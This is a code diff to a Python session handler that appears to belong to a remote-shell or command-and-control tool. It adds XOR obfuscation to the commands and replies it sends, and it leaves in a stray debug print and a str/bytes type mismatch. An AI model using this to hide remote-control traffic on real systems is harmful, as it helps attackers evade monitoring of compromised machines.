@@ -81,7 +81,8 @@ class CheckConn:
         '''
         try:
             print("[==] sendata")
-            sock.send(payload)
+
+            sock.send(XOREncryption(payload).encode())
         except ConnectionError as connerr: #If the connection does not answer
             if(Handler.status_connection_display):
                 printColor("error","[-] The connection to the client was cut {}:{}.\n".format(Handler.dict_conn[nb_session][NB_IP],Handler.dict_conn[nb_session][NB_PORT]))
@@ -131,20 +132,24 @@ class CheckConn:
             sock.settimeout(None)
             return result #empty return
     
-    def recvcommand(self, sock, buffer):
+    def recvcommand(self, sock, buffer):#The decryption of xor is automatic on this method.
         #Gets the data without delay (session "-c 'command' ")
-        result = b""
+        result = ""
 
         while True:
             try:
-                data = sock.recv(buffer)
+                data_tmp = sock.recv(buffer).decode("utf8","replace")
+                print("\nn\----->1:",data_tmp)
+                data = XOREncryption(data_tmp)
+                
             except ConnectionError as connerr:
                 printColor("error", "[-] error in recvsafe: {}".format(connerr))
                 result = b"ERROR"
             else:
-                if(data ==b"\r\n"):
+                if(data =="\r\n"):
                     break
                 else:
                     result += data
         
+        #print("RESULT: ", result)
         return result
